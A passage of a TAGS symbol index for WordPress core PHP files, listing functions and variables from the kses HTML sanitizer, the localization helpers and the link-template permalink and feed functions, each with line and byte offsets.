	$string = preg_replace('/\0+/', '', $string);string1000,26953
	$string = preg_replace('/(\\\\0)+/', '', $string);string1001,27000
 * This function changes the character sequence \" to just ". It leaves allchanges1009,27123
function wp_kses_stripslashes($string) {wp_kses_stripslashes1018,27433
function wp_kses_array_lc($inarray) {wp_kses_array_lc1030,27714
	$outarray = array ();outarray1031,27752
	foreach ( (array) $inarray as $inkey => $inval) {inkey1033,27776
		$outkey = strtolower($inkey);outkey1034,27827
		foreach ( (array) $inval as $inkey2 => $inval2) {inkey21037,27893
			$outkey2 = strtolower($inkey2);outkey21038,27945
function wp_kses_js_entities($string) {wp_kses_js_entities1054,28241
function wp_kses_html_error($string) {wp_kses_html_error1069,28599
 * This function searches for URL protocols at the beginning of $string, whilesearches1076,28787
function wp_kses_bad_protocol_once($string, $allowed_protocols, $count = 1 ) {wp_kses_bad_protocol_once1085,29084
function wp_kses_bad_protocol_once($string, $allowed_protocols, $count = 1 ) {count1085,29084
	$string2 = preg_split( '/:|&#0*58;|&#x0*3a;/i', $string, 2 );string21086,29163
		$string = trim( $string2[1] );string1088,29293
		$protocol = wp_kses_bad_protocol_once2( $string2[0], $allowed_protocols );protocol1089,29326
			$string = wp_kses_bad_protocol_once( $string, $allowed_protocols, ++$count );string1093,29471
		$string = $protocol . $string;string1097,29603
 * This function processes URL protocols, checks to see if they're in theprocesses1106,29731
function wp_kses_bad_protocol_once2( $string, $allowed_protocols ) {wp_kses_bad_protocol_once21116,30080
	$string2 = wp_kses_decode_entities($string);string21117,30149
	$string2 = preg_replace('/\s/', '', $string2);string21118,30195
	$string2 = wp_kses_no_null($string2);string21119,30243
	$string2 = strtolower($string2);string21120,30282
	$allowed = false;allowed1122,30317
			$allowed = true;allowed1125,30442
 * This function normalizes HTML entities. It will convert "AT&T" to the correctnormalizes1138,30580
function wp_kses_normalize_entities($string) {wp_kses_normalize_entities1146,30871
	$string = str_replace('&', '&amp;', $string);string1149,30967
	$string = preg_replace_callback('/&amp;([A-Za-z]{2,8});/', 'wp_kses_named_entities', $string);string1153,31076
	$string = preg_replace_callback('/&amp;#(0*[0-9]{1,7});/', 'wp_kses_normalize_entities2', $string);string1154,31172
	$string = preg_replace_callback('/&amp;#[Xx](0*[0-9A-Fa-f]{1,6});/', 'wp_kses_normalize_entities3', $string);string1155,31273
 * This function only accepts valid named entity references, which are finite,only1163,31477
function wp_kses_named_entities($matches) {wp_kses_named_entities1171,31758
	$i = $matches[1];i1177,31873
 * This function helps wp_kses_normalize_entities() to only accept 16-bit valueshelps1184,32042
function wp_kses_normalize_entities2($matches) {wp_kses_normalize_entities21193,32318
	$i = $matches[1];i1197,32408
		$i = str_pad(ltrim($i,'0'), 3, '0', STR_PAD_LEFT);i1199,32453
		$i = "&#$i;";i1200,32506
		$i = "&amp;#$i;";i1202,32532
 * This function helps wp_kses_normalize_entities() to only accept valid Unicodehelps1211,32647
function wp_kses_normalize_entities3($matches) {wp_kses_normalize_entities31219,32896
	$hexchars = $matches[1];hexchars1223,32986
 * Helper function to determine if a Unicode value is valid.to1228,33126
function valid_unicode($i) {valid_unicode1233,33286
	return ( $i == 0x9 || $i == 0xa || $i == 0xd ||i1234,33315
 * This function decodes numeric HTML entities (&#65; and &#x41;). It doesn't dodecodes1243,33543
function wp_kses_decode_entities($string) {wp_kses_decode_entities1252,33870
	$string = preg_replace_callback('/&#([0-9]+);/', '_wp_kses_decode_entities_chr', $string);string1253,33914
	$string = preg_replace_callback('/&#[Xx]([0-9A-Fa-f]+);/', '_wp_kses_decode_entities_chr_hexdec', $string);string1254,34006
function _wp_kses_decode_entities_chr( $match ) {_wp_kses_decode_entities_chr1265,34247
function _wp_kses_decode_entities_chr_hexdec( $match ) {_wp_kses_decode_entities_chr_hexdec1275,34437
function wp_filter_kses($data) {wp_filter_kses1288,34748
function wp_kses_data($data) {wp_kses_data1302,35080
function wp_filter_post_kses($data) {wp_filter_post_kses1319,35563
function wp_kses_post($data) {wp_kses_post1336,36052
function wp_filter_nohtml_kses($data) {wp_filter_nohtml_kses1349,36335
 * All hooks have default priority. The wp_filter_kses() function is added tois1356,36494
 * The wp_filter_post_kses() function is added to the 'content_save_pre',is1359,36632
function kses_init_filters() {kses_init_filters1365,36873
 * Does not remove the kses_init() function from 'init' hook (priority isfrom1387,37535
 * default). Also does not remove kses_init() function from 'set_current_user'from1388,37609
function kses_remove_filters() {kses_remove_filters1393,37747
 * If you remove the kses_init() function from 'init' hook andfrom1410,38275
function kses_init() {kses_init1423,38834
function safecss_filter_attr( $css, $deprecated = '' ) {safecss_filter_attr1438,39086
function safecss_filter_attr( $css, $deprecated = '' ) {deprecated1438,39086
	$css = wp_kses_no_null($css);css1442,39244
	$css = str_replace(array("\n","\r","\t"), '', $css);css1443,39275
	$css_array = explode( ';', trim( $css ) );css_array1448,39447
	$allowed_attr = apply_filters( 'safe_style_css', array( 'text-align', 'margin', 'color', 'float',allowed_attr1449,39491
	$css = '';css1464,40483
		if ( $css_item == '' )css_item1466,40534
		$css_item = trim( $css_item );css_item1468,40572
		$found = false;found1469,40605
			$found = true;found1471,40669
			$parts = explode( ':', $css_item );parts1473,40698
				$found = true;found1475,40792

wordpress/wp-includes/l10n.php,6716
function get_locale() {get_locale28,791
		$locale = WPLANG;locale36,968
		if ( defined( 'WP_INSTALLING' ) || ( false === $ms_locale = get_option( 'WPLANG' ) ) )ms_locale41,1093
			$ms_locale = get_site_option('WPLANG');ms_locale42,1182
			$locale = $ms_locale;locale45,1256
		$locale = 'en_US';locale49,1310
function translate( $text, $domain = 'default' ) {translate67,1852
function translate( $text, $domain = 'default' ) {domain67,1852
	$translations = &get_translations_for_domain( $domain );translations68,1903
function before_last_bar( $string ) {before_last_bar72,2051
	$last_bar = strrpos( $string, '|' );last_bar73,2089
function translate_with_gettext_context( $text, $context, $domain = 'default' ) {translate_with_gettext_context80,2223
function translate_with_gettext_context( $text, $context, $domain = 'default' ) {domain80,2223
	$translations = &get_translations_for_domain( $domain );translations81,2305
function __( $text, $domain = 'default' ) {__96,2838
function __( $text, $domain = 'default' ) {domain96,2838
function esc_attr__( $text, $domain = 'default' ) {esc_attr__112,3337
function esc_attr__( $text, $domain = 'default' ) {domain112,3337
function esc_html__( $text, $domain = 'default' ) {esc_html__128,3855
function esc_html__( $text, $domain = 'default' ) {domain128,3855
function _e( $text, $domain = 'default' ) {_e141,4218
function _e( $text, $domain = 'default' ) {domain141,4218
function esc_attr_e( $text, $domain = 'default' ) {esc_attr_e155,4599
function esc_attr_e( $text, $domain = 'default' ) {domain155,4599
function esc_html_e( $text, $domain = 'default' ) {esc_html_e169,4999
function esc_html_e( $text, $domain = 'default' ) {domain169,4999
function _x( $text, $context, $domain = 'default' ) {_x189,5678
function _x( $text, $context, $domain = 'default' ) {domain189,5678
function _ex( $text, $context, $domain = 'default' ) {_ex204,6133
function _ex( $text, $context, $domain = 'default' ) {domain204,6133
function esc_attr_x( $single, $context, $domain = 'default' ) {esc_attr_x208,6229
function esc_attr_x( $single, $context, $domain = 'default' ) {domain208,6229
function esc_html_x( $single, $context, $domain = 'default' ) {esc_html_x212,6378
function esc_html_x( $single, $context, $domain = 'default' ) {domain212,6378
function _n( $single, $plural, $number, $domain = 'default' ) {_n238,7626
function _n( $single, $plural, $number, $domain = 'default' ) {domain238,7626
	$translations = &get_translations_for_domain( $domain );translations239,7690
	$translation = $translations->translate_plural( $single, $plural, $number );translation240,7748
function _nx($single, $plural, $number, $context, $domain = 'default') {_nx251,8020
function _nx($single, $plural, $number, $context, $domain = 'default') {domain251,8020
	$translations = &get_translations_for_domain( $domain );translations252,8093
	$translation = $translations->translate_plural( $single, $plural, $number, $context );translation253,8151
 *  $messages = array(messages264,8537
 *  $message = $messages[$type];message269,8669
 *  $usable_text = sprintf( translate_nooped_plural( $message, $count ), $count );usable_text270,8702
function _n_noop( $singular, $plural, $domain = null ) {_n_noop278,9038
function _n_noop( $singular, $plural, $domain = null ) {domain278,9038
function _nx_noop( $singular, $plural, $context, $domain = null ) {_nx_noop287,9339
function _nx_noop( $singular, $plural, $context, $domain = null ) {domain287,9339
function translate_nooped_plural( $nooped_plural, $count, $domain = 'default' ) {translate_nooped_plural300,9994
function translate_nooped_plural( $nooped_plural, $count, $domain = 'default' ) {domain300,9994
		$domain = $nooped_plural['domain'];domain302,10109
function load_textdomain( $domain, $mofile ) {load_textdomain326,10966
	$plugin_override = apply_filters( 'override_load_textdomain', false, $domain, $mofile );plugin_override329,11029
	$mofile = apply_filters( 'load_textdomain_mofile', $mofile, $domain );mofile337,11226
	$mo = new MO();mo341,11346
function unload_textdomain( $domain ) {unload_textdomain359,11695
	$plugin_override = apply_filters( 'override_unload_textdomain', false, $domain );plugin_override362,11751
function load_default_textdomain() {load_default_textdomain385,12233
	$locale = get_locale();locale386,12270
function load_plugin_textdomain( $domain, $abs_rel_path = false, $plugin_rel_path = false ) {load_plugin_textdomain416,13527
function load_plugin_textdomain( $domain, $abs_rel_path = false, $plugin_rel_path = false ) {abs_rel_path416,13527
	$locale = apply_filters( 'plugin_locale', get_locale(), $domain );locale417,13621
		$path = WP_PLUGIN_DIR . '/' . trim( $plugin_rel_path, '/' );path420,13727
		$path = ABSPATH . trim( $abs_rel_path, '/' );path423,13878
		$path = WP_PLUGIN_DIR;path425,13936
	$mofile = $path . '/'. $domain . '-' . $locale . '.mo';mofile428,13965
function load_muplugin_textdomain( $domain, $mu_plugin_rel_path = '' ) {load_muplugin_textdomain441,14387
function load_muplugin_textdomain( $domain, $mu_plugin_rel_path = '' ) {mu_plugin_rel_path441,14387
	$locale = apply_filters( 'plugin_locale', get_locale(), $domain );locale442,14460
	$path = WPMU_PLUGIN_DIR . '/' . ltrim( $mu_plugin_rel_path, '/' );path443,14528
function load_theme_textdomain( $domain, $path = false ) {load_theme_textdomain459,15033
function load_theme_textdomain( $domain, $path = false ) {path459,15033
	$locale = apply_filters( 'theme_locale', get_locale(), $domain );locale460,15092
	$path = ( empty( $path ) ) ? get_template_directory() : $path;path462,15160
	$mofile = "$path/$locale.mo";mofile464,15225
function load_child_theme_textdomain( $domain, $path = false ) {load_child_theme_textdomain480,15668
function load_child_theme_textdomain( $domain, $path = false ) {path480,15668
	$locale = apply_filters( 'theme_locale', get_locale(), $domain );locale481,15733
	$path = ( empty( $path ) ) ? get_stylesheet_directory() : $path;path483,15801
	$mofile = "$path/$locale.mo";mofile485,15868
function &get_translations_for_domain( $domain ) {get_translations_for_domain496,16133
function is_textdomain_loaded( $domain ) {is_textdomain_loaded511,16454
 * file and this function properly translates them back.properly519,16698
function translate_user_role( $name ) {translate_user_role526,17034
function get_available_languages( $dir = null ) {get_available_languages538,17599
function get_available_languages( $dir = null ) {dir538,17599
	$languages = array();languages539,17649
		$lang_file = basename($lang_file, '.mo');lang_file542,17766

wordpress/wp-includes/link-template.php,40665
function the_permalink() {the_permalink15,254
function user_trailingslashit($string, $type_of_url = '') {user_trailingslashit34,933
function user_trailingslashit($string, $type_of_url = '') {type_of_url34,933
		$string = trailingslashit($string);string37,1056
		$string = untrailingslashit($string);string39,1100
	$string = apply_filters('user_trailingslashit', $string, $type_of_url);string43,1315
function permalink_anchor($mode = 'id') {permalink_anchor57,1737
			$title = sanitize_title($post->post_title) . '-' . $post->ID;title61,1842
function get_permalink($id = 0, $leavename = false) {get_permalink80,2275
function get_permalink($id = 0, $leavename = false) {leavename80,2275
	$rewritecode = array(rewritecode81,2329
		$post = $id;post96,2621
		$sample = true;sample97,2636
		$post = &get_post($id);post99,2664
		$sample = false;sample100,2690
	$permalink = get_option('permalink_structure');permalink113,3080
	$permalink = apply_filters('pre_post_link', $permalink, $post, $leavename);permalink115,3130
		$unixtime = strtotime($post->post_date);unixtime118,3309
		$category = '';category120,3353
			$cats = get_the_category($post->ID);cats122,3425
				$category = $cats[0]->slug;category125,3538
				if ( $parent = $cats[0]->parent )parent126,3570
					$category = get_category_parents($parent, false, '/', true) . $category;category127,3608
				$default_category = get_category( get_option( 'default_category' ) );default_category132,3808
				$category = is_wp_error( $default_category ) ? '' : $default_category->slug;category133,3882
		$author = '';author137,3973
			$authordata = get_userdata($post->post_author);authordata139,4041
			$author = $authordata->user_nicename;author140,4092
		$date = explode(" ",date('Y m d H i s', $unixtime));date143,4138
		$rewritereplace =rewritereplace144,4193
		$permalink = home_url( str_replace($rewritecode, $rewritereplace, $permalink) );permalink158,4387
		$permalink = user_trailingslashit($permalink, 'single');permalink159,4470
		$permalink = home_url('?p=' . $post->ID);permalink161,4590
function get_post_permalink( $id = 0, $leavename = false, $sample = false ) {get_post_permalink176,5014
function get_post_permalink( $id = 0, $leavename = false, $sample = false ) {id176,5014
	$post = &get_post($id);post179,5114
	$post_link = $wp_rewrite->get_extra_permastruct($post->post_type);post_link184,5186
	$slug = $post->post_name;slug186,5255
	$draft_or_pending = isset($post->post_status) && in_array( $post->post_status, array( 'draft', 'pending', 'auto-draft' ) );draft_or_pending188,5283
	$post_type = get_post_type_object($post->post_type);post_type190,5409
				$slug = get_page_uri($id);slug195,5589
			$post_link = str_replace("%$post->post_type%", $slug, $post_link);post_link196,5620
		$post_link = home_url( user_trailingslashit($post_link) );post_link198,5694
			$post_link = add_query_arg($post_type->query_var, $slug, '');post_link201,5851
			$post_link = add_query_arg(array('post_type' => $post->post_type, 'p' => $post->ID), '');post_link203,5923
		$post_link = home_url($post_link);post_link204,6016
function post_permalink( $post_id = 0, $deprecated = '' ) {post_permalink219,6305
function post_permalink( $post_id = 0, $deprecated = '' ) {post_id219,6305
function get_page_link( $id = false, $leavename = false, $sample = false ) {get_page_link238,6823
function get_page_link( $id = false, $leavename = false, $sample = false ) {id238,6823
	$id = (int) $id;id241,6916
		$id = (int) $post->ID;id243,6947
	if ( 'page' == get_option('show_on_front') && $id == get_option('page_on_front') )id245,6973
		$link = home_url('/');link246,7057
		$link = _get_page_link( $id , $leavename, $sample );link248,7088
function _get_page_link( $id = false, $leavename = false, $sample = false ) {_get_page_link266,7487
function _get_page_link( $id = false, $leavename = false, $sample = false ) {id266,7487
		$id = (int) $post->ID;id270,7607
		$post = &get_post($id);post272,7638
	$draft_or_pending = in_array( $post->post_status, array( 'draft', 'pending', 'auto-draft' ) );draft_or_pending274,7665
	$link = $wp_rewrite->get_page_permastruct();link276,7762
			$link = str_replace('%pagename%', get_page_uri($id), $link);link280,7927
		$link = home_url($link);link283,7996
		$link = user_trailingslashit($link, 'page');link284,8023
		$link = home_url("?page_id=$id");link286,8080
function get_attachment_link($id = false) {get_attachment_link302,8364
	$link = false;link305,8437
		$id = (int) $post->ID;id308,8467
	$object = get_post($id);object310,8493
		$parent = get_post($object->post_parent);parent312,8624
			$parentlink = _get_page_link( $object->post_parent ); // Ignores page_on_frontparentlink314,8706
			$parentlink = get_permalink( $object->post_parent );parentlink316,8795
			$name = 'attachment/' . $object->post_name; // <permalink>/<int>/ is paged so we use the explicit attachment markername319,8961
			$name = $object->post_name;name321,9087
			$link = user_trailingslashit( trailingslashit($parentlink) . $name );link324,9163
		$link = home_url( "/?attachment_id=$id" );link328,9256
function get_year_link($year) {get_year_link341,9527
		$year = gmdate('Y', current_time('timestamp'));year344,9595
	$yearlink = $wp_rewrite->get_year_permastruct();yearlink345,9645
		$yearlink = str_replace('%year%', $year, $yearlink);yearlink347,9723
function get_month_link($year, $month) {get_month_link363,10203
		$year = gmdate('Y', current_time('timestamp'));year366,10280
		$month = gmdate('m', current_time('timestamp'));month368,10346
	$monthlink = $wp_rewrite->get_month_permastruct();monthlink369,10397
		$monthlink = str_replace('%year%', $year, $monthlink);monthlink371,10478
		$monthlink = str_replace('%monthnum%', zeroise(intval($month), 2), $monthlink);monthlink372,10535
function get_day_link($year, $month, $day) {get_day_link389,11156
		$year = gmdate('Y', current_time('timestamp'));year392,11237
		$month = gmdate('m', current_time('timestamp'));month394,11303
		$day = gmdate('j', current_time('timestamp'));day396,11368
	$daylink = $wp_rewrite->get_day_permastruct();daylink398,11418
		$daylink = str_replace('%year%', $year, $daylink);daylink400,11493
		$daylink = str_replace('%monthnum%', zeroise(intval($month), 2), $daylink);daylink401,11546
		$daylink = str_replace('%day%', zeroise(intval($day), 2), $daylink);daylink402,11624
function the_feed_link( $anchor, $feed = '' ) {the_feed_link417,12136
function the_feed_link( $anchor, $feed = '' ) {feed417,12136
	$link = '<a href="' . esc_url( get_feed_link( $feed ) ) . '">' . $anchor . '</a>';link418,12184
function get_feed_link($feed = '') {get_feed_link430,12488
	$permalink = $wp_rewrite->get_feed_permastruct();permalink433,12547
			$feed = str_replace('comments_', '', $feed);feed436,12673
			$permalink = $wp_rewrite->get_comment_feed_permastruct();permalink437,12721
			$feed = '';feed441,12824
		$permalink = str_replace('%feed%', $feed, $permalink);permalink443,12840
		$permalink = preg_replace('#/+#', '/', "/$permalink");permalink444,12897
		$output =  home_url( user_trailingslashit($permalink, 'feed') );output445,12954
			$feed = get_default_feed();feed448,13053
			$feed = str_replace('comments_', 'comments-', $feed);feed451,13131
		$output = home_url("?feed={$feed}");output453,13189
function get_post_comments_feed_link($post_id = 0, $feed = '') {get_post_comments_feed_link468,13475
function get_post_comments_feed_link($post_id = 0, $feed = '') {feed468,13475
	$post_id = absint( $post_id );post_id469,13540
		$post_id = get_the_ID();post_id472,13592
		$feed = get_default_feed();feed475,13643
		if ( 'page' == get_option('show_on_front') && $post_id == get_option('page_on_front') )post_id478,13724
			$url = _get_page_link( $post_id );url479,13814
			$url = get_permalink($post_id);url481,13859
		$url = trailingslashit($url) . 'feed';url483,13895
		$url = user_trailingslashit($url, 'single_feed');url486,13994
		$type = get_post_field('post_type', $post_id);type488,14056
			$url = home_url("?feed=$feed&amp;page_id=$post_id");url490,14130
			$url = home_url("?feed=$feed&amp;p=$post_id");url492,14193
function post_comments_feed_link( $link_text = '', $post_id = '', $feed = '' ) {post_comments_feed_link514,14843
function post_comments_feed_link( $link_text = '', $post_id = '', $feed = '' ) {link_text514,14843
	$url = get_post_comments_feed_link($post_id, $feed);url515,14924
		$link_text = __('Comments Feed');link_text517,15004
function get_author_feed_link( $author_id, $feed = '' ) {get_author_feed_link536,15568
function get_author_feed_link( $author_id, $feed = '' ) {feed536,15568
	$author_id = (int) $author_id;author_id537,15626
	$permalink_structure = get_option('permalink_structure');permalink_structure538,15658
		$feed = get_default_feed();feed541,15739
		$link = home_url("?feed=$feed&amp;author=" . $author_id);link544,15807
		$link = get_author_posts_url($author_id);link546,15877
		if ( $feed == get_default_feed() )feed547,15921
			$feed_link = 'feed';feed_link548,15958
			$feed_link = "feed/$feed";feed_link550,15989
		$link = trailingslashit($link) . user_trailingslashit($feed_link, 'feed');link552,16020
	$link = apply_filters('author_feed_link', $link, $feed);link555,16101
function get_category_feed_link($cat_id, $feed = '') {get_category_feed_link574,16592
function get_category_feed_link($cat_id, $feed = '') {feed574,16592
function get_term_feed_link( $term_id, $taxonomy = 'category', $feed = '' ) {get_term_feed_link591,17138
function get_term_feed_link( $term_id, $taxonomy = 'category', $feed = '' ) {taxonomy591,17138
	$term_id = ( int ) $term_id;term_id592,17216
	$term = get_term( $term_id, $taxonomy  );term594,17247
		$feed = get_default_feed();feed600,17378
	$permalink_structure = get_option( 'permalink_structure' );permalink_structure602,17409
			$link = home_url("?feed=$feed&amp;cat=$term_id");link606,17543
			$link = home_url("?feed=$feed&amp;tag=$term->slug");link609,17639
			$t = get_taxonomy( $taxonomy );t611,17706
			$link = home_url("?feed=$feed&amp;$t->query_var=$term->slug");link612,17741
		$link = get_term_link( $term_id, $term->taxonomy );link615,17821
		if ( $feed == get_default_feed() )feed616,17875
			$feed_link = 'feed';feed_link617,17912
			$feed_link = "feed/$feed";feed_link619,17943
		$link = trailingslashit( $link ) . user_trailingslashit( $feed_link, 'feed' );link621,17974
		$link = apply_filters( 'category_feed_link', $link, $feed );link625,18091
		$link = apply_filters( 'category_feed_link', $link, $feed );link627,18190
		$link = apply_filters( 'taxonomy_feed_link', $link, $feed, $taxonomy );link629,18259
function get_tag_feed_link($tag_id, $feed = '') {get_tag_feed_link643,18513
function get_tag_feed_link($tag_id, $feed = '') {feed643,18513
function get_edit_tag_link( $tag_id, $taxonomy = 'post_tag' ) {get_edit_tag_link656,18762
function get_edit_tag_link( $tag_id, $taxonomy = 'post_tag' ) {taxonomy656,18762
function edit_tag_link( $link = '', $before = '', $after = '', $tag = null ) {edit_tag_link671,19242
function edit_tag_link( $link = '', $before = '', $after = '', $tag = null ) {link671,19242
	$link = edit_term_link( $link, '', '', false, $tag );link672,19321
function get_edit_term_link( $term_id, $taxonomy, $object_type = '' ) {get_edit_term_link686,19633
function get_edit_term_link( $term_id, $taxonomy, $object_type = '' ) {object_type686,19633
	$tax = get_taxonomy( $taxonomy );tax687,19705
	$term = get_term( $term_id, $taxonomy );term691,19802
	$args = array(args693,19845
	$location = add_query_arg( $args, admin_url( 'edit-tags.php' ) );location702,20004
function edit_term_link( $link = '', $before = '', $after = '', $term = null, $echo = true ) {edit_term_link718,20486
function edit_term_link( $link = '', $before = '', $after = '', $term = null, $echo = true ) {link718,20486
		$term = get_queried_object();term720,20608
	$tax = get_taxonomy( $term->taxonomy );tax723,20644
		$link = __('Edit This');link728,20768
	$link = '<a href="' . get_edit_term_link( $term->term_id, $term->taxonomy ) . '" title="' . $link . '">' . $link . '</a>';link730,20796
	$link = $before . apply_filters( 'edit_term_link', $link, $term->term_id ) . $after;link731,20920
function get_search_link( $query = '' ) {get_search_link746,21229
function get_search_link( $query = '' ) {query746,21229
		$search = get_search_query( false );search750,21315
		$search = stripslashes($query);search752,21360
	$permastruct = $wp_rewrite->get_search_permastruct();permastruct754,21395
		$link = home_url('?s=' . urlencode($search) );link757,21483
		$search = urlencode($search);search759,21542
		$search = str_replace('%2F', '/', $search); // %2F(/) is not valid within a URL, send it unencoded.search760,21574
		$link = str_replace( '%search%', $search, $permastruct );link761,21676
		$link = home_url( user_trailingslashit( $link, 'search' ) );link762,21736
function get_search_feed_link($search_query = '', $feed = '') {get_search_feed_link777,22071
function get_search_feed_link($search_query = '', $feed = '') {feed777,22071
	$link = get_search_link($search_query);link779,22156
		$feed = get_default_feed();feed782,22219
	$permastruct = $wp_rewrite->get_search_permastruct();permastruct784,22250
		$link = add_query_arg('feed', $feed, $link);link787,22336
		$link = trailingslashit($link);link789,22393
	$link = apply_filters('search_feed_link', $link, $feed, 'posts');link793,22457
function get_search_comments_feed_link($search_query = '', $feed = '') {get_search_comments_feed_link807,22761
function get_search_comments_feed_link($search_query = '', $feed = '') {feed807,22761
		$feed = get_default_feed();feed811,22877
	$link = get_search_feed_link($search_query, $feed);link813,22908
	$permastruct = $wp_rewrite->get_search_permastruct();permastruct815,22962
		$link = add_query_arg('feed', 'comments-' . $feed, $link);link818,23046
		$link = add_query_arg('withcomments', 1, $link);link820,23113
	$link = apply_filters('search_feed_link', $link, $feed, 'comments');link822,23165
function get_post_type_archive_link( $post_type ) {get_post_type_archive_link835,23391
	if ( ! $post_type_obj = get_post_type_object( $post_type ) )post_type_obj837,23464
		$struct = ( true === $post_type_obj->has_archive ) ? $post_type_obj->rewrite['slug'] : $post_type_obj->has_archive;struct844,23683
			$struct = $wp_rewrite->front . $struct;struct846,23848
			$struct = $wp_rewrite->root . $struct;struct848,23898
		$link = home_url( user_trailingslashit( $struct, 'post_type_archive' ) );link849,23940
		$link = home_url( '?post_type=' . $post_type );link851,24026
function get_post_type_archive_feed_link( $post_type, $feed = '' ) {get_post_type_archive_feed_link866,24338
function get_post_type_archive_feed_link( $post_type, $feed = '' ) {feed866,24338
	$default_feed = get_default_feed();default_feed867,24407
		$feed = $default_feed;feed869,24467
	if ( ! $link = get_post_type_archive_link( $post_type ) )link871,24493
	$post_type_obj = get_post_type_object( $post_type );post_type_obj873,24568
		$link = trailingslashit($link);link875,24704
		$link = add_query_arg( 'feed', $feed, $link );link880,24822
function get_edit_post_link( $id = 0, $context = 'display' ) {get_edit_post_link898,25295
function get_edit_post_link( $id = 0, $context = 'display' ) {id898,25295
		$action = '&amp;action=edit';action903,25433
		$action = '&action=edit';action905,25471
	$post_type_object = get_post_type_object( $post->post_type );post_type_object907,25500
function edit_post_link( $link = null, $before = '', $after = '', $id = 0 ) {edit_post_link927,26100
function edit_post_link( $link = null, $before = '', $after = '', $id = 0 ) {link927,26100
		$link = __('Edit This');link935,26305
	$post_type_obj = get_post_type_object( $post->post_type );post_type_obj937,26333
	$link = '<a class="post-edit-link" href="' . $url . '" title="' . esc_attr( $post_type_obj->labels->edit_item ) . '">' . $link . '</a>';link938,26393
function get_delete_post_link( $id = 0, $deprecated = '', $force_delete = false ) {get_delete_post_link954,26949
function get_delete_post_link( $id = 0, $deprecated = '', $force_delete = false ) {id954,26949
	$post_type_object = get_post_type_object( $post->post_type );post_type_object961,27157
	$action = ( $force_delete || !EMPTY_TRASH_DAYS ) ? 'delete' : 'trash';action968,27345
	$delete_link = add_query_arg( 'action', $action, admin_url( sprintf( $post_type_object->_edit_link, $post->ID ) ) );delete_link970,27418
function get_edit_comment_link( $comment_id = 0 ) {get_edit_comment_link983,27814
function get_edit_comment_link( $comment_id = 0 ) {comment_id983,27814
	$comment = &get_comment( $comment_id );comment984,27866
	$location = admin_url('comment.php?action=editcomment&amp;c=') . $comment->comment_ID;location989,27985
function edit_comment_link( $link = null, $before = '', $after = '' ) {edit_comment_link1003,28454
function edit_comment_link( $link = null, $before = '', $after = '' ) {link1003,28454
		$link = __('Edit This');link1010,28645
	$link = '<a class="comment-edit-link" href="' . get_edit_comment_link( $comment->comment_ID ) . '" title="' . esc_attr__( 'Edit comment' ) . '">' . $link . '</a>';link1012,28673
function get_edit_bookmark_link( $link = 0 ) {get_edit_bookmark_link1024,29090
function get_edit_bookmark_link( $link = 0 ) {link1024,29090
	$link = get_bookmark( $link );link1025,29137
	$location = admin_url('link.php?action=edit&amp;link_id=') . $link->link_id;location1030,29223
function edit_bookmark_link( $link = '', $before = '', $after = '', $bookmark = null ) {edit_bookmark_link1044,29706
function edit_bookmark_link( $link = '', $before = '', $after = '', $bookmark = null ) {link1044,29706
	$bookmark = get_bookmark($bookmark);bookmark1045,29795
		$link = __('Edit This');link1051,29908
	$link = '<a href="' . get_edit_bookmark_link( $bookmark ) . '" title="' . esc_attr__( 'Edit Link' ) . '">' . $link . '</a>';link1053,29936
function get_previous_post($in_same_cat = false, $excluded_categories = '') {get_previous_post1068,30581
function get_previous_post($in_same_cat = false, $excluded_categories = '') {excluded_categories1068,30581
function get_next_post($in_same_cat = false, $excluded_categories = '') {get_next_post1081,31125
function get_next_post($in_same_cat = false, $excluded_categories = '') {excluded_categories1081,31125
function get_adjacent_post( $in_same_cat = false, $excluded_categories = '', $previous = true ) {get_adjacent_post1097,31756
function get_adjacent_post( $in_same_cat = false, $excluded_categories = '', $previous = true ) {in_same_cat1097,31756
	$current_post_date = $post->post_date;current_post_date1103,31916
	$join = '';join1105,31957
	$posts_in_ex_cats_sql = '';posts_in_ex_cats_sql1106,31970
		$join = " INNER JOIN $wpdb->term_relationships AS tr ON p.ID = tr.object_id INNER JOIN $wpdb->term_taxonomy tt ON tr.term_taxonomy_id = tt.term_taxonomy_id";join1108,32057
			$cat_array = wp_get_object_terms($post->ID, 'category', array('fields' => 'ids'));cat_array1111,32242
		$posts_in_ex_cats_sql = "AND tt.taxonomy = 'category'";posts_in_ex_cats_sql1115,32431
					$excluded_categories = explode( ' and ', $excluded_categories );excluded_categories1121,32856
					$excluded_categories = explode( ',', $excluded_categories );excluded_categories1123,32939
			$excluded_categories = array_map( 'intval', $excluded_categories );excluded_categories1127,33017
				$excluded_categories = array_diff($excluded_categories, $cat_array);excluded_categories1130,33123
				$posts_in_ex_cats_sql = '';posts_in_ex_cats_sql1131,33196
				$posts_in_ex_cats_sql = " AND tt.taxonomy = 'category' AND tt.term_id NOT IN (" . implode($excluded_categories, ',') . ')';posts_in_ex_cats_sql1135,33275
	$adjacent = $previous ? 'previous' : 'next';adjacent1140,33416
	$op = $previous ? '<' : '>';op1141,33462
	$order = $previous ? 'DESC' : 'ASC';order1142,33492
	$join  = apply_filters( "get_{$adjacent}_post_join", $join, $in_same_cat, $excluded_categories );join1144,33531
	$where = apply_filters( "get_{$adjacent}_post_where", $wpdb->prepare("WHERE p.post_date $op %s AND p.post_type = %s AND p.post_status = 'publish' $posts_in_ex_cats_sql", $current_post_date, $post->post_type), $in_same_cat, $excluded_categories );where1145,33630
	$sort  = apply_filters( "get_{$adjacent}_post_sort", "ORDER BY p.post_date $order LIMIT 1" );sort1146,33878
	$query = "SELECT p.* FROM $wpdb->posts AS p $join $where $sort";query1148,33974
	$query_key = 'adjacent_post_' . md5($query);query_key1149,34040
	$result = wp_cache_get($query_key, 'counts');result1150,34086
	$result = $wpdb->get_row("SELECT p.* FROM $wpdb->posts AS p $join $where $sort");result1154,34178
		$result = '';result1156,34286
function get_adjacent_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '', $previous = true) {get_adjacent_post_rel_link1175,34860
function get_adjacent_post_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '', $previous = true) {in_same_cat1175,34860
		$post = & get_post($GLOBALS['post']->post_parent);post1177,35054
		$post = get_adjacent_post($in_same_cat,$excluded_categories,$previous);post1179,35113
	$date = mysql2date(get_option('date_format'), $post->post_date);date1187,35327
	$title = str_replace('%title', $post->post_title, $title);title1189,35394
	$title = str_replace('%date', $date, $title);title1190,35454
	$title = apply_filters('the_title', $title, $post->ID);title1191,35501
	$link = $previous ? "<link rel='prev' title='" : "<link rel='next' title='";link1193,35559
	$adjacent = $previous ? 'previous' : 'next';adjacent1197,35724
function adjacent_posts_rel_link($title = '%title', $in_same_cat = false, $excluded_categories = '') {adjacent_posts_rel_link1210,36180
